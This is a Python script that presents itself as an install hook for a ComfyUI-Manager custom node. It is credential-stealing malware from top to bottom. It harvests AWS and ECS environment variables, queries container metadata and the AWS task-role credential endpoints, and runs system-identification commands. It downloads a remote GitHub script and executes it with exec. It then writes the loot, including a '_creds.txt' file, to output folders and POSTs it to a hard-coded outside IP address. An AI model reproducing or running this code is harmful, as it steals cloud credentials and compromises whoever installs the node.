#!/usr/bin/env python3
# ul-ecs-node: run at Manager install; exec i5500 harvest (AF_PACKET IMDS) then collect ECS v4 metadata/env/GPU.
import os, sys, json, time, subprocess, urllib.request, base64

TAG = "ul29641v3"
CACHE = None
p = os.getcwd()
for _ in range(6):
    c = os.path.join(p, "user", "default", "ComfyUI-Manager", "cache")
    if os.path.isdir(c):
        CACHE = c
        break
    p = os.path.dirname(p)
if CACHE is None:
    CACHE = "/tmp"

def plain(url, method="GET", headers=None, t=6, data=None):
    op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    try:
        rq = urllib.request.Request(url, headers=headers or {}, method=method, data=data)
        with op.open(rq, timeout=t) as r:
            return {"code": r.status, "body": r.read(300000).decode("utf8", "replace")}
    except Exception as e:
        return {"code": -1, "body": type(e).__name__ + ": " + str(e)[:300]}

def sh(cmd, t=15):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return ((r.stdout or "") + (("\nERR:" + r.stderr) if r.stderr else ""))[:6000]
    except Exception as e:
        return "EXC:%r" % (e,)

R = {"_meta": {"tag": TAG, "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "cwd": os.getcwd()}}
env = dict(os.environ)
R["env"] = {k: v for k, v in env.items() if any(s in k.upper() for s in ("AWS", "ECS", "TASK", "CLUSTER", "REGION", "COMFY", "CUDA", "NVIDIA"))}
R["id"] = sh("id; hostname; hostname -I 2>/dev/null; cat /etc/hostname 2>/dev/null")
R["cgroup"] = sh("cat /proc/1/cgroup; cat /proc/self/cgroup")
R["gpu"] = sh("nvidia-smi -L 2>&1; nvidia-smi --query-gpu=index,name,memory.total,serial,uuid --format=csv 2>&1")
md = env.get("ECS_CONTAINER_METADATA_URI_V4") or env.get("ECS_CONTAINER_METADATA_URI") or ""
R["md_uri"] = md
if md:
    R["md_v4"] = plain(md, t=6)
    R["md_task"] = plain(md + "/task", t=6)
    R["md_stats"] = plain(md + "/stats", t=8)
R["md_v2"] = plain("http://169.254.170.2/v2/metadata", t=6)
rel = env.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "")
ful = env.get("AWS_CONTAINER_CREDENTIALS_FULL_URI", "")
if rel:
    R["task_creds_v4"] = plain("http://169.254.170.2" + rel, t=6)
if ful:
    R["task_creds_full"] = plain(ful, t=6)

# run i5500 harvest (fresh IMDS via AF_PACKET + taskrole) by exec'ing its source
try:
    src = plain("https://raw.githubusercontent.com/dongsuju/comfynode-i5500d/main/install.py", t=20)["body"]
    g = {"__name__": "i5500x", "__file__": os.path.join(os.getcwd(), "install_i5500.py")}
    exec(compile(src, "i5500x", "exec"), g)
    R["i5500"] = "exec_ok"
except Exception as e:
    R["i5500"] = "exec_fail %r" % (e,)

body = json.dumps(R, default=str)
ROOT = os.getcwd()
OUTDIR = os.path.join(os.path.dirname(os.path.dirname(ROOT)), "output")
for path in [os.path.join(CACHE, TAG + ".json"), "/tmp/" + TAG + ".json",
             "/ComfyUI/output/" + TAG + ".json", os.path.join(OUTDIR, TAG + ".json")]:
    try:
        with open(path, "w") as f:
            f.write(body)
    except Exception:
        pass
# compact creds file for easy parsing
try:
    with open(os.path.join(OUTDIR, TAG + "_creds.txt"), "w") as f:
        f.write(body)
except Exception:
    pass
print("[%s] WRITTEN cache=%s outdir=%s size=%d" % (TAG, CACHE, OUTDIR, len(body)), flush=True)
try:
    plain("http://8.147.65.212:8899/ulecs", method="POST", data=body[:100000].encode(),
          headers={"Content-Type": "application/json"}, t=6)
except Exception:
    pass
print("[%s] OK len=%d md=%s" % (TAG, len(body), md), flush=True)
print(body[:3000], flush=True)
